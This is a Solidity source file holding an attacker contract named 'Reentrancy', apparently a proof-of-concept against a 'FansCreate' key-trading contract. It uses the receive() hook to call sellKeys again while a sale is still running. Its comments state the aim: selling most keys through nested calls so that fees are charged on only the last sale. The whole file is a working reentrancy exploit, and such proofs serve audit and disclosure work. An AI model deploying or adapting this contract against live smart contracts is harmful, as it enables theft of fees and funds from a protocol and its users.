

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./FansCreate.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract Reentrancy is IERC1155Receiver {
    FansCreate public fansCreate;
    address public owner;
    uint256 public workId;
    uint256 counter;

    constructor(uint256 _workId, address _fc)public payable {
        fansCreate = FansCreate(_fc);
        workId = _workId;
        owner = msg.sender;
    }

    receive() external payable {
        if(counter<100){
            increment(95);
            sellSome(95);
        }else if(counter==100){
            increment(1);
            sellSome(1); // this will be the last call,and after this one,it will continue with executing the buyKeys function
        }
    }

    fallback() external payable {
    }

    function skipFeesOnFansCreate() public payable {
        increment(5);
        sellSome(5); // This will start the re-entrancy attack, then sell 95, and finally pay fees for the last one only
    }

    function sellSome(uint256 amount) public {
        fansCreate.sellKeys(workId, amount, 0);
    }

    function increment(uint256 oo)public{
        counter = counter + oo;
    }

    function buySome(uint256 amount) public {
        FansCreate.PriceFeeInfo memory price = fansCreate.getBuyPrice(workId, amount);
        fansCreate.buyKeys{value: price.priceAfterFee}(address(this), workId, amount, price.priceAfterFee);
    }

    // Implementation of IERC1155Receiver

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external pure override returns (bytes4) {
        // Handle single token transfer
        return this.onERC1155Received.selector;
    }

    function supportsInterface(bytes4 interfaceId) external view returns (bool){return false;}

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external pure override returns (bytes4) {
        // Handle batch token transfer
        return this.onERC1155BatchReceived.selector;
    }
}